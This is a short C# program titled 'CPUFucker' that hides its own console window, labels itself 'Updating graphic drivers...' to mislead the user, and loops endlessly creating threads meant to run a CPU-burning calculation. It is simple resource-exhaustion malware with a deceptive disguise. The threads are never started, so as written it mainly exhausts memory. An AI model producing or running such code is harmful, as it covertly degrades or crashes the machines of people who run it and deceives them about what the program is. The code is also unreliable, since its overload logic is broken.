using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;

namespace CPUFucker
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static List<Thread> Threads1 = new List<Thread>();
        public static List<Thread> Threads2 = new List<Thread>();
        public static List<Thread> Threads3 = new List<Thread>();
        public static Random Rand = new Random();
        
        static void Main(string[] args)
        {
            // Hide console :)
            Console.Title = "Updating graphic drivers..."; // Why ? Don't ask me.
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, 0);
            
            while (true)
            {
                Threads1.Add(new Thread(new ThreadStart(Overload)));
                Threads2.Add(new Thread(new ThreadStart(Overload)));
                Threads3.Add(new Thread(new ThreadStart(Overload)));
            }
        }

        public static void Overload()
        {
            long current = 0;

            while (true)
            {
                current += (long) Math.Sin(Math.Cos(Math.Sin(Math.Cos(Math.Cos(Math.Abs(Rand.Next(100, 10000)))))));
                if (current > 1000000)
                {
                    current = 0;
                }
            }
        }
    }
}